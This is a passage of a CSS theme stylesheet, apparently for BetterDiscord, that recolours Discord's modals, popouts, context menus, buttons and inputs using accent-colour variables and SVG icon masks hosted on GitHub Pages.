	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_ai_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="archive"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.archive-2hqXug::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_archive_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="audio"] + *::after,
.audioMetadata-3zOuGv > *:first-child::after,
.uploadModal-2ifh8j .icon-kyxXVr.audio-14DQXq::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_audio_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="code"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.code-aoB-kL::after,
.uploadModalIn-1z07Bv .icon-kyxXVr.two-3BBQI9::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_code_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="document"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.document-2cvI0u::after,
.uploadModalIn-1z07Bv .icon-kyxXVr.three-27ScFD::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_document_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="photoshop"] + *::after,
.attachment-33OFj0 .icon-1kp3fr[title="ps"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.photoshop-1UWfyZ::after,
.uploadModal-2ifh8j .icon-kyxXVr.ps-2T6Jrl::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_photoshop_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="sketch"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.sketch-ZMuo7D::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_sketch_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="spreadsheet"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.spreadsheet-1QuSej::after,
.uploadModalIn-1z07Bv .icon-kyxXVr.one-2crnLX::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_spreadsheet_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="video"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.video-27RLEH::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_video_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="webcode"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.webcode-22GGLX::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_webcode_accent.svg) center/contain no-repeat;
}

/* ----		10.5.	KEYBOARDSHORTCUTSMODAL			---- */

.ddrArrows-lSnH7P .arrow-2enltQ,							/* modal				arrows								*/
.ddrArrows-lSnH7P .arrow-2enltQ::after {
	height: 50px;
	width: 50px;
}
.ddrArrows-lSnH7P .arrow-2enltQ.active-2X6Ewx {
	filter: brightness(130%);
}
.ddrArrows-lSnH7P .arrow-2enltQ {
	position: relative;
	animation: none !important;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/keybinds_arrows_bg.svg) center/contain no-repeat !important;
}
.ddrArrows-lSnH7P .arrow-2enltQ::after {
	content: "";
	position: absolute;
	top: 0;
	left: 0;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/keybinds_arrows_accent.svg) center/contain no-repeat;
}
.ddrArrows-lSnH7P .arrow-2enltQ.down-2Ju7Q_ {
	transform: rotate(270deg);
}
.ddrArrows-lSnH7P .arrow-2enltQ.up-fkTose {
	transform: rotate(90deg);
}
.ddrArrows-lSnH7P .arrow-2enltQ.right-1AEPK3 {
	transform: rotate(180deg);
}


/* ----		10.6.	LOGINSCREEN						---- */

.authBox-hW6HRx a {											/* authobox				links								*/
	color: rgb(var(--vaccentcolor));
}

.authBox-hW6HRx img[src="/assets/0f4d1ff76624bb45a3fee4189279ee92.svg"] {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/login_authbox_bg.svg) center/cover no-repeat;
}
.authBox-hW6HRx img[src="/assets/0f4d1ff76624bb45a3fee4189279ee92.svg"] + * {
	position: relative;
	display: flex;
	justify-content: center;
}
.authBox-hW6HRx img[src="/assets/0f4d1ff76624bb45a3fee4189279ee92.svg"] + *::before {
	content: "";
	position: absolute;
	top: -107px;
	width: 124px;
	height: 84px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/login_authbox_mask.svg) center/cover no-repeat;
}

.startOverButton-3q0wUV {
	color: rgb(var(--vaccentcolor));
}

/* ----		10.7.	DOWNLOADAPPMODAL				---- */

.downloadApps-wbBFdZ .footer-1nkeBm a {
	color: rgb(var(--vaccentcolor));
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .platform-iik236.active-iLSdWQ {
	border-color: rgb(var(--vaccentcolor));
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .platform-iik236.active-iLSdWQ p {
	color: rgb(var(--vaccentcolor));
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .platform-iik236.active-iLSdWQ .downloadButton-1bWXpg {
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ {
	background: rgb(var(--vaccentcolor));
	-webkit-mask-size: cover;
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.apple-1fKN59 {
	-webkit-mask: url(https://discordapp.com/assets/7ddab19e24325212299490c2f413b122.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.windows-29yOum {
	-webkit-mask: url(https://discordapp.com/assets/37ce528f3abf4d735a624309e990acc6.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.linux-15cW1y {
	-webkit-mask: url(https://discordapp.com/assets/f8e3f6e7b2cf5f10aed43243560a1b91.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.ios-Z7K-rr {
	-webkit-mask: url(https://discordapp.com/assets/00a1b0447f0474ecaa767a4bc09fe2ed.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.android-gGrHJu {
	-webkit-mask: url(https://discordapp.com/assets/676bfec9f4343f6fcdf0a12ae313a3de.svg);
}

.browserItem-1mKMYK:hover {
	border-color: rgb(var(--vaccentcolor));
}
.browserItem-1mKMYK:hover .btn-3wPLTq {
	background-color: rgb(var(--vaccentcolor));
	border-color: rgb(var(--vaccentcolor));
}

/* ----		10.8.	GUILDBOOSTMODAL					---- */

															/* modal				boost header						*/
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] {
	object-position: -999999px -999999px;
	width: 96px;
	height: 60px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_boostheader_bg.svg) center/cover no-repeat;
}
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + *:not(svg),
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + svg + * {
	position: relative;
}
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + *:not(svg)::after,
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + svg + *::after {
	content: "";
	position: absolute;
	top: -132px;
	left: calc((100% - 96px) / 2);
	width: 96px;
	height: 60px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor2));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_boostheader_accent.svg) center/cover no-repeat;
}
.badgeIconWithSubscribers-3PlMu9 {							/* modal				sub badge icon						*/
	color: rgb(var(--vaccentcolor2));
}
#app-mount .icon-QVoPRH {									/* modal				perkicon general					*/
	color: rgb(var(--vaccentcolor2));
}
															/* modal				tiermarker in progress tier3		*/
#app-mount .tierMarkerInProgress-24LMzJ .currentTierIcon-2gcTCn.tier3Icon-Ku4Ahe {
	color: rgb(var(--vaccentcolor2));
}
.tierMarkerAccomplished-2MiXeg {							/* modal				tiermarker accomplished				*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor2)), rgba(var(--vaccentcolor2), 0.7)) !important;
}
#app-mount .barForeground-3KglC8 {							/* modal				tierbarfill							*/
	background-color: rgb(var(--vaccentcolor2));
}
#app-mount .barSecondary-3B1aP2 {							/* modal				previewbarfill						*/
	background: var(--interactive-hover) linear-gradient(90deg, rgba(var(--vaccentcolor2), 0.3), rgba(var(--vaccentcolor2), 0.3));
}
#app-mount .iconIncluded-24npcq {							/* modal				included perkicon					*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .upload-2-2ZMI {									/* modal				perkicon upload						*/
	color: rgb(var(--vaccentcolor2));
}
#app-mount .animated-XlVkOl {								/* modal				perkicon animated					*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(75%);
}
#app-mount .stream-3mNTxK {									/* modal				perkicon stream						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(150%);
}
#app-mount .tierUnlocked-25K6Kv {							/* modal				tierunlocked						*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .tierHeaderUnlocked-1n-OTI {						/* modal				tierheaderunlockedbg				*/
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor2)), rgba(var(--vaccentcolor2), 0.5));
}
.wrapper-3nSjSv {											/* modal				boostaddwrapper						*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor2)), rgba(var(--vaccentcolor2), 0.5));
}
.wrapper-3nSjSv::before,									/* modal				boostangel							*/
.wrapper-3nSjSv::after {
	content: "";
	position: absolute;
	top: -44px;
	right: -82px;
	width: 168px;
	height: 88px;
	pointer-events: none;
}
.wrapper-3nSjSv::before {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_boostangel_bg.svg) center/cover no-repeat;
}
.wrapper-3nSjSv::after {
	background: rgb(var(--vaccentcolor2));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_boostangel_accent.svg) center/cover no-repeat;
}
#app-mount .wrapper-3nSjSv .lookInverted-2D7oAl.colorBrand-3pXr91 {
	color: rgb(var(--vaccentcolor2)) !important;
}
.tierMarkerLabelPlusIcon-1OS7E9 {							/* modal				prebuy icon							*/
	color: rgb(var(--vaccentcolor2));
}
.upsellFooterIcon-2105bD path {								/* prebuy popout		footer icon							*/
	fill: rgb(var(--vaccentcolor));
}
.perkIconGuild-KLNhuR {										/* prebuy popout		perkicon guild						*/
	color: rgb(var(--vaccentcolor2));
}
.perkIconChatPerks-BnKNFh {									/* prebuy popout		perkicon chat						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(120%);
}
.perkIconStream-7wqAvn {									/* prebuy popout		perkicon stream						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(150%);
}

/* ----		10.9.	STREAMSETTINGSMODAL				---- */

.selectorButtonSelected-336oUc,								/* modal				selectorselectedbutton				*/
.selectorButtonSelected-1j4DmC {
	background-color: rgb(var(--vaccentcolor));
}
.badgeUpgrade-1DzdNZ {										/* modal				badgeupgrade						*/
	color: rgb(var(--vaccentcolor));
}
.imageSelected-4Kl81J {										/* modal				imageselected						*/
	border-color: rgb(var(--vaccentcolor));
}
.tile-2silOL:hover .sourceThumbnail-14Iubx {				/* modal				sourcethumbnail						*/
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}
.sourceThumbnail-14Iubx.selected-3Qtv-u {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}

/* ----		10.10.	DISPATCHERRORMODAL				---- */

.theme-light .closeLink-2MRAUp {							/* modal				closelink							*/
	color: rgb(var(--vaccentcolor));
}

/* ----		10.11.	CHANGELOGMODAL					---- */

.content-s2SEQO a {											/* modal				link								*/
	color: var(--text-link);
}
.improved-1NJK-y {											/* modal				improved category					*/
	color: rgb(var(--vaccentcolor));
}
.improved-1NJK-y::after {
	background-color: rgb(var(--vaccentcolor));
}

.premiumBanner-rP6H1S {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

/* ----		10.12.	SCREENSHAREMODAL				---- */

.tile-2w4k5N:hover .sourceThumbnail-27dolk {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}
.sourceThumbnail-27dolk.selected-1nOkyc {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}
.selectorButton-EEUWed:not(.selectorButtonPremiumRequired-mKMbIu):hover {
	background-color: rgb(var(--vaccentcolor));
}
.selectorButtonSelected-t5V9On {
	background-color: rgb(var(--vaccentcolor));
}

/* ----		10.13.	PHONEVERIFICATIONMODAL			---- */

.phoneVerificationModal-OzcDc3 path[fill="rgb(118,134,177)"] {
	fill: rgb(var(--vaccentcolor));
}

/* ----		10.14.	CUSTOMSTATUSMODAL				---- */

.art-347BZj {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/customstatus_header_bg.svg) center/contain no-repeat;
}
.art-347BZj::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/customstatus_header_accent.svg) center/contain no-repeat;
}


/* ~~~~		11.		POPOUTS							~~~~ */

.popoutLeft-3aViER.arrowAlignmentTop-1yftWI::before {
	border-left-color: #rgb(var(--vaccentcolor));
}
.popoutRight-1veHKi.arrowAlignmentTop-1yftWI::before {
	border-right-color: #rgb(var(--vaccentcolor));
}
.popoutBottom-2GAFPg.arrowAlignmentMiddle-NBGtsX::before,
.popoutBottom-2GAFPg.arrowAlignmentTop-1yftWI::before,
.popoutBottomLeft-1pG8B4.arrowAlignmentMiddle-NBGtsX::before,
.popoutBottomLeft-1pG8B4.arrowAlignmentTop-1yftWI::before,
.popoutBottomRight-2Rno5S.arrowAlignmentMiddle-NBGtsX::before,
.popoutBottomRight-2Rno5S.arrowAlignmentTop-1yftWI::before,
.theme-light.popoutBottom-2GAFPg.arrowAlignmentMiddle-NBGtsX::before,
.theme-light.popoutBottom-2GAFPg.arrowAlignmentTop-1yftWI::before,
.theme-light.popoutBottomLeft-1pG8B4.arrowAlignmentMiddle-NBGtsX::before,
.theme-light.popoutBottomLeft-1pG8B4.arrowAlignmentTop-1yftWI::before,
.theme-light.popoutBottomRight-2Rno5S.arrowAlignmentMiddle-NBGtsX::before,
.theme-light.popoutBottomRight-2Rno5S.arrowAlignmentTop-1yftWI::before {
	border-bottom-color: #rgb(var(--vaccentcolor));
}
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTop-3WSJtH.arrowAlignmentMiddle-NBGtsX::before,
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTop-3WSJtH.arrowAlignmentTop-1yftWI::before,
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTopRight-1lc8Mq.arrowAlignmentMiddle-NBGtsX::before,
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTopRight-1lc8Mq.arrowAlignmentTop-1yftWI::before {
	border-top-color: #rgb(var(--vaccentcolor));
}
.theme-light.contentNarrowMedia-W7SHxH.topArrow-1B63md::before,
.theme-light .contentNarrowNoMedia-Il01H1.topArrow-1B63md::before,
.theme-light.contentWideNoMedia-22TIu6.topArrow-1B63md::before,
.theme-light .contentWideNoMedia-22TIu6.topArrow-1B63md::before {
	border-bottom-color: #rgb(var(--vaccentcolor));
}

/* ----		11.1.	CONTEXTMENU						---- */

.colorBrand-ROmMP1,											/* contextmenu			brand								*/
.colorDefault-2K3EoJ:not(.focused-3afm-j)[id="user-settings-cog-Discord_Nitro"] {
	color: rgb(var(--vaccentcolor));
}
.colorPremium-p4p7qO,										/* contextmenu			premium								*/
.colorDefault-2K3EoJ:not(.focused-3afm-j)[id="user-settings-cog-Nitro_Server_Boost"],
.colorDefault-2K3EoJ:not(.focused-3afm-j)[id="guild-context-guild-settings--GUILD_PREMIUM"] {
	color: rgb(var(--vaccentcolor2));
}
.colorDefault-2K3EoJ.focused-3afm-j,
.colorDefault-2K3EoJ:hover:not(.hideInteraction-1iHO1O),
.colorDefault-2K3EoJ:active:not(.hideInteraction-1iHO1O) {
	background-color: rgb(var(--vaccentcolor));
}
.colorPremium-p4p7qO.focused-3afm-j,
.colorPremium-p4p7qO:hover:not(.hideInteraction-1iHO1O),
.colorPremium-p4p7qO:active:not(.hideInteraction-1iHO1O),
.colorDefault-2K3EoJ.focused-3afm-j[id="user-settings-cog-Nitro_Server_Boost"],
.colorDefault-2K3EoJ:hover:not(.hideInteraction-1iHO1O)[id="user-settings-cog-Nitro_Server_Boost"],
.colorDefault-2K3EoJ:active:not(.hideInteraction-1iHO1O)[id="user-settings-cog-Nitro_Server_Boost"],
.colorDefault-2K3EoJ.focused-3afm-j[id="guild-context-guild-settings--GUILD_PREMIUM"],
.colorDefault-2K3EoJ:hover:not(.hideInteraction-1iHO1O)[id="guild-context-guild-settings--GUILD_PREMIUM"],
.colorDefault-2K3EoJ:active:not(.hideInteraction-1iHO1O)[id="guild-context-guild-settings--GUILD_PREMIUM"] {
	background-color: rgb(var(--vaccentcolor2));
}
.colorDanger-2qLCe1.focused-3afm-j,
.colorDanger-2qLCe1:hover:not(.hideInteraction-1iHO1O),
.colorDanger-2qLCe1:active:not(.hideInteraction-1iHO1O) {
	background-color: #F04747;
}
.colorDefault-2K3EoJ .radioSelection-1HmrQS {				/* contextmenu			radioselection						*/
	color: rgb(var(--vaccentcolor));
}
.colorPremium-p4p7qO .radioSelection-1HmrQS {
	color: rgb(var(--vaccentcolor2));
}
.colorDanger-2qLCe1 .radioSelection-1HmrQS {
	color: #F04747;
}
.colorDefault-2K3EoJ .checkbox-3s5GYZ {						/* contextmenu			checkbox							*/
	color: rgb(var(--vaccentcolor));
}
.colorPremium-p4p7qO .checkbox-3s5GYZ {
	color: rgb(var(--vaccentcolor2));
}
.colorDanger-2qLCe1 .checkbox-3s5GYZ {
	color: #F04747;
}
.colorDefault-2K3EoJ.focused-3afm-j .check-1JyqgN,			/* contextmenu			checkmark							*/
.colorDefault-2K3EoJ:hover:not(.hideInteraction-1iHO1O) .check-1JyqgN,
.colorDefault-2K3EoJ:active:not(.hideInteraction-1iHO1O) .check-1JyqgN {
	color: rgb(var(--vaccentcolor));
}
.colorPremium-p4p7qO.focused-3afm-j .check-1JyqgN,
.colorPremium-p4p7qO:hover:not(.hideInteraction-1iHO1O) .check-1JyqgN,
.colorPremium-p4p7qO:active:not(.hideInteraction-1iHO1O) .check-1JyqgN {
	color: rgb(var(--vaccentcolor));
}
.colorDanger-2qLCe1.focused-3afm-j .check-1JyqgN,
.colorDanger-2qLCe1:hover:not(.hideInteraction-1iHO1O) .check-1JyqgN,
.colorDanger-2qLCe1:active:not(.hideInteraction-1iHO1O) .check-1JyqgN {
	color: #F04747;
}
.icon-LYJorE {												/* contextmenu			icon								*/
	color: currentColor !important;
}

/* ----		11.2.	USERPOPOUT						---- */

.headerPlaying-j0WQBV {
	background: rgb(var(--vaccentcolor));
}
.headerStreaming-2FjmGz {
	background: #593695;
}

/* ----		11.3.	EMOJIPICKER						---- */

.emojiPicker-3m1S-j .categories-1feg4n .selected-39BZ4S {	/* emojipicker			selected category					*/
	border-bottom-color: rgb(var(--vaccentcolor));
}

/* ----		11.4.	PINS/MENTIONS					---- */

.hasMoreButton-1MELpI {										/* popout				hasmore button						*/
	color: rgb(var(--vaccentcolor));
}

/* ----		11.5.	SEARCHPOPOUT					---- */
															/* datepicker			day hover							*/
#app-mount .calendarPicker-2yf6Ci .react-datepicker__day.react-datepicker__day--selected:hover,
#app-mount .calendarPicker-2yf6Ci .react-datepicker__day:not(.react-datepicker__day--disabled):hover {
	background-color: rgb(var(--vaccentcolor));
}
															/* datepicker			day selectd							*/
#app-mount .calendarPicker-2yf6Ci .react-datepicker__day.react-datepicker__day--selected::after {
	background-color: rgb(var(--vaccentcolor));
}
															/* datepicker			hintvalue							*/
#app-mount .datePicker--XZbmJ .datePickerHint-3Q1Udw .hintValue-29ny8Z {
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		12.		GENERAL							~~~~ */

.wanderingCubesItem-WPXqao {								/* loading				cubes								*/
	background-color: rgb(var(--vaccentcolor));
}
.chasingDotsItem-2DVNUn {									/* loading				dots								*/
	background-color: rgb(var(--vaccentcolor));
}
.theme-light .path-92Hmty,									/* loading				circle								*/
.theme-dark .path-92Hmty,
.theme-dark .path2-1q7bG_ {
	stroke: rgb(var(--vaccentcolor));
}

/* ----		12.1.	TEXT							---- */

.brand-2-tkdo {
	color: rgb(var(--vaccentcolor));
}
.colorBrand-2tjs5J {
	color: rgb(var(--vaccentcolor));
}
.tipTitle-GL9qAt {
	color: rgb(var(--vaccentcolor));
}

/* ----		12.2.	BUTTONS							---- */

#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91 .spinnerItem-3GlVyU,
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91 .spinnerItem-3GlVyU,
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91 .spinnerItem-3GlVyU,
#app-mount .lookLink-9FtZy-.colorBrand-3pXr91 .spinnerItem-3GlVyU {
	background-color: rgb(var(--vaccentcolor));
}

#app-mount .btn-1PnLxm.btnPrimary-1jluZW:hover:not(:disabled),
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO):hover,
#app-mount .lookFilled-1Gx00P.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background: var(--vaccentcolor-hover);
}
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO):active,
#app-mount .lookFilled-1Gx00P.hoverBrand-1_Fxlk.hasHover-3X1-zV:active {
	background: var(--vaccentcolor-active);
}
#app-mount .btn-1PnLxm.btnPrimary-1jluZW,
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO),
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO):disabled {
	background: rgb(var(--vaccentcolor));
}

#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91:hover,
#app-mount .lookInverted-2D7oAl.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background-image: linear-gradient(0deg, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1));
}
#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91:active,
#app-mount .lookInverted-2D7oAl.hoverBrand-1_Fxlk.hasHover-3X1-zV:active {
	background-image: linear-gradient(0deg, rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2));
}
#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91,
#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91:disabled {
	color: rgb(var(--vaccentcolor));
}

#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91:hover,
#app-mount .lookOutlined-3sRXeN.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	border-color: rgba(var(--vaccentcolor), 0.6);
}
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91:active,
#app-mount .lookOutlined-3sRXeN.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background-color: rgba(var(--vaccentcolor), 0.1);
	border-color: rgb(var(--vaccentcolor));
}
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91,
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91:disabled {
	border-color: rgba(var(--vaccentcolor), 0.1);
	color: rgb(var(--vaccentcolor));
}

#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91:hover,
#app-mount .lookGhost-2Fn_0-.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background-color: rgba(var(--vaccentcolor), 0.15);
}
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91:active,
#app-mount .lookGhost-2Fn_0-.hoverBrand-1_Fxlk.hasHover-3X1-zV:active {
	background-color: rgba(var(--vaccentcolor), 0.2);
}
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91,
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91:disabled {
	background-color: rgba(var(--vaccentcolor), 0.1);
	color: rgb(var(--vaccentcolor));
}

#app-mount .lookLink-9FtZy-.colorBrand-3pXr91 {
	color: rgb(var(--vaccentcolor));
}
#app-mount .lookLink-9FtZy-.colorBrand-3pXr91:hover .contents-18-Yxp,
#app-mount .lookLink-9FtZy-.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover .contents-18-Yxp {
	background-image: linear-gradient(0deg, transparent, transparent 1px, rgb(var(--vaccentcolor)) 0, rgb(var(--vaccentcolor)) 2px, transparent 0);
	color: rgb(var(--vaccentcolor));
}

/* ----		12.3.	INPUTS							---- */

.input-cIJ7To.focused-1mmYsC,								/* textinput			focused								*/
.input-cIJ7To:focus {
	border-color: rgb(var(--vaccentcolor));
}
.input-cIJ7To.error-2O5WFJ {
	border-color: #f04747;
}
.input-cIJ7To.success-2-F980 {
	border-color: #43b581;
}
.focused-1mmYsC {
	border-color: rgb(var(--vaccentcolor));
}
#app-mount .prefixInput-14nUik.focused-2QzoMt {
	border-color: rgb(var(--vaccentcolor));
}
															/* checkbox				checked 							*/
.checkbox-3kaeSU .checkboxInner-3yjcPe .checkboxElement-1qV33p:checked + span {
	background-color: rgb(var(--vaccentcolor));
	border-color: rgb(var(--vaccentcolor));
}
															/* checkbox				checked alt							*/
.checkbox-3kaeSU .checkboxInner-3yjcPe.alt-6FvZrq .checkboxElement-1qV33p:checked + span::after {
	border-color: rgb(var(--vaccentcolor));
}

.checkbox-1ix_J3.checked-3_4uQ9[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}
.checkbox-1ix_J3.checked-3_4uQ9[style*="border-color: rgb(114, 137, 218)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}

.container-3auIfb {											/* switch				unchecked							*/
	background-color: rgb(114, 118, 125) !important;
	transition: background-color .1s ease-out;
}															/* switch				checked								*/
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"],
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgba(var(--vaccentcolor), 0.8) !important;
}
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"]:hover,
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"]:hover {
	background: var(--vaccentcolor-hover);
}
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"]:active,
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"]:active {
	background: var(--vaccentcolor-active);
}
.container-3auIfb path[fill] {
	fill: rgb(114, 118, 125) !important;
}
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"] path[fill],
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"] path[fill] {
	fill: rgb(var(--vaccentcolor)) !important;
}

.barFill-23-gu- {
	background: rgb(var(--vaccentcolor));
}
.mediaBarGrabber-1FqnbN,
.mediaBarProgress-1xaPtl,
.mediaBarProgress-1xaPtl::after,
.mediaBarProgress-1xaPtl::before {
	background-color: rgb(var(--vaccentcolor));
}
.mediaBarInteraction-37i2O4:hover .mediaBarGrabber-1FqnbN,
.mediaBarInteractionDragging-2QurIZ .mediaBarGrabber-1FqnbN {
	background-color: rgb(var(--vaccentcolor));
	filter: brightness(120%);
}

.theme-light .select-1Pkeg4:focus,
.theme-light .lookFilled-1h1y05.select-1Pkeg4:focus {
	border-color: rgb(var(--vaccentcolor));
}
.theme-light .lookFilled-1h1y05.select-1Pkeg4:hover.selectOpen-hQuR6b,
.theme-light .lookFilled-1h1y05.selectOpen-hQuR6b {
	border-color: rgb(var(--vaccentcolor)) rgb(var(--vaccentcolor)) #b9bbbe;
}
.theme-dark .select-1Pkeg4:focus,
.theme-dark .lookFilled-1h1y05.select-1Pkeg4:focus {
	border-color: rgb(var(--vaccentcolor));
}
.theme-dark .lookFilled-1h1y05.select-1Pkeg4:hover.selectOpen-hQuR6b,
.theme-dark .lookFilled-1h1y05.selectOpen-hQuR6b {
	border-color: rgb(var(--vaccentcolor)) rgb(var(--vaccentcolor)) rgba(0, 0, 0, 0.3);
}
.selectedIcon-3uS11H {
	color: rgb(var(--vaccentcolor));
}

/* ----		12.4.	TAGS							---- */

.botTagRegular-2HEhHi {
	background-color: rgb(var(--vaccentcolor));
}
.botTagInvert-18-95s {										/* bottag				inverted							*/
	color: rgb(var(--vaccentcolor));
}

.verified-1eC5dy {											/* verifiedbadge											*/
